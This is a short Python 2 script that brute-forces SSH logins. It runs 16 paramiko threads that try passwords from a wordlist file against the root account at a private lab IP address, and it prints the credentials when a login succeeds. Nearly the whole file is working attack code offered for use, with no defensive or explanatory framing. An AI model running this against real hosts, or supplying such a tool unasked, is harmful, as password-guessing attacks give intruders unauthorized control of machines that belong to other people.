#-*- coding: utf-8 -*-

#Author：陕晨阳

import paramiko
import threading
lock = threading.Lock()
threading.run = True
paramiko.util.log_to_file('paramiko.log')

def ssh_brute(ip,username,f):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	while threading.run:
		try:
			lock.acquire()
			passwd = f.readline().strip()
			print '%s\t\t%s:%s\t'%(ip,username,passwd)
			lock.release()
			ssh.connect(ip,22,username,passwd,timeout=10)
			print '\n%s\t\t\t%s:%s\t'%('ip','user','passwd')
			print '%s\t\t%s:%s\t\n'%(ip,username,passwd)
			threading.run = False
		except:
			pass
		finally:
			ssh.close()

ip = "192.168.136.128"
username = "root"  #用户名
f = open('part456.txt','r')
print u'正在爆破中，请稍后。。。'
for i in range(16):
    a=threading.Thread(target=ssh_brute,args=(ip,username,f))
    a.start()
